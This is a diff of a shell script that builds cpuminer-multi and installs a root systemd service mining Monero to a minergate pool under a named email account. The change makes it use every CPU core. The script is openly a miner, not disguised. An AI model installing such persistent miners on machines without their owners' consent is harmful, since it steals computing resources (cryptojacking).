@@ -14,11 +14,10 @@ else
 fi
 make clean && make
 
-printf "#!/bin/bash\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=$((`grep -c ^processor /proc/cpuinfo` - 1))" > /root/miner.sh
+printf "#!/bin/bash\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=`eval grep -c ^processor /proc/cpuinfo`" > /root/miner.sh
 printf "[Unit]\n\n[Service]\nExecStart=/root/miner.sh\n\n[Install]\nWantedBy=default.target" > /etc/systemd/system/miner.service
 sudo chmod +x /root/miner.sh
 sudo chmod 744 /root/miner.sh
 sudo chmod 664 /etc/systemd/system/miner.service
 systemctl enable miner.service
 service miner start
-service miner status
